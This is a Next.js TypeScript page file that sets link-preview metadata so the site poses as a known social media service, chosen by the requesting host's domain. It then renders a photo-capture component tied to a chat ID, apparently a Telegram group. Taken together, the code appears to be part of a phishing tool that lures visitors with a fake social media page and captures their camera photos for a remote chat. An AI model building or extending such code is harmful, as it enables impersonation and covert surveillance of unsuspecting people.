import type { Metadata } from "next";
import { headers } from "next/headers";
import { notFound } from "next/navigation";
import { PhotoCapture } from "~/app/_components/photo-capture";
import { checkChatAccessibility } from "~/shared/check-chat-accessibility";
import { type Domains, SOCIAL_MEDIA } from "~/shared/constants/social-media";

interface Props {
	params: Promise<{ chatId: string }>;
}

function getSocialMediaByDomain(host: string) {
	const service = Object.values(SOCIAL_MEDIA)
		.map(({ domain }) => domain)
		.find((domain): domain is Domains => host.includes(domain));

	return service ? SOCIAL_MEDIA[service] : undefined;
}

export async function generateMetadata(): Promise<Metadata | undefined> {
	const _headers = await headers();
	const protocol = _headers.get("X-Forwarded-Proto");
	const host = _headers.get("X-Forwarded-Host");
	if (!host || !protocol) {
		return;
	}

	const socialMedia = getSocialMediaByDomain(host);
	if (!socialMedia) {
		return;
	}

	return {
		title: socialMedia.pageTitle,
		description: socialMedia.pageDescription,
		openGraph: {
			title: socialMedia.pageTitle,
			description: socialMedia.pageDescription,
			url: socialMedia.originalUrl,
			images: {
				url: new URL(`${protocol}://${host}/og-images/${socialMedia.domain}.png`),
				alt: `${socialMedia.name} OpenGraph Image`
			},
			type: "website"
		},
		twitter: {
			card: "summary"
		}
	};
}

export default async function Page(props: Props) {
	const params = await props.params;
	const chatId = params.chatId.startsWith("100") ? Number("-" + params.chatId) : Number(params.chatId);

	if (Number.isNaN(chatId)) {
		return notFound();
	}

	const canSendPhoto = await checkChatAccessibility(chatId);
	if (!canSendPhoto) {
		return notFound();
	}

	return (
		<div className="w-full h-full flex flex-col justify-center items-center">
			<PhotoCapture chatId={chatId} />
		</div>
	);
}
